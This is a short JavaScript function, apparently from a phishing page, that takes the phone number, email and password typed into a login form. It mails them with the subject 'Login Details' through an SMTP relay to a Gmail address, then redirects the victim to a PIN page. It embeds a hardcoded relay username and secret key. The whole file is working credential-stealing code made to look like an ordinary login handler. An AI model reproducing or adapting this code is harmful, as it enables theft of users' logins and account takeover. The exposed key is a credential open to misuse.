function emailSend() {
  var tel = document.getElementById('tel').value;
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var messageBody = "Tel" + tel + "<br/> Email " + email +
    "<br/> password " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "60F88560F588591A7F78F2A9E657115D12C3",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}
